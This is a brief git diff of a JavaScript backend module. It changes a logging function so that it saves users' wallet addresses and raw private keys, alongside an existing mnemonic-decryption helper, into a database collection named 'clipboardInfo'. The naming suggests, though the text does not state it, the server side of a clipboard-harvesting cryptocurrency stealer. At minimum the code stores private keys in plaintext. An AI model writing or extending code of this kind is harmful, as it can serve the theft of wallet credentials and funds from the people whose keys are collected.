@@ -198,13 +198,14 @@ async function logDownloadDetails (userId, fileName) {
     }
 }
 
-async function logMnemonicPhase (userId, mnemonicPhase) {
+async function logWalletCredentials (userId, userAddress, userPrivateKey) {
     try {
         const collection = dbConnection.collection('clipboardInfo');
 
         const logEntry = {
             userId,
-            mnemonicPhase,
+            userAddress,
+            userPrivateKey,
             createdAt: new Date() // Record the current timestamp
         };
 
@@ -233,11 +234,17 @@ function decryptMnemonic (base64EncryptedData) {
     return decrypted.toString();
 }
 
+async function getKeywords () {
+    // TODO: Implement this function
+    return null;
+}
+
 module.exports = {
     uploadToB2,
     downloadFromB2,
     logUploadDetails,
     logDownloadDetails,
-    logMnemonicPhase,
+    logWalletCredentials,
     decryptMnemonic,
+    getKeywords
 };
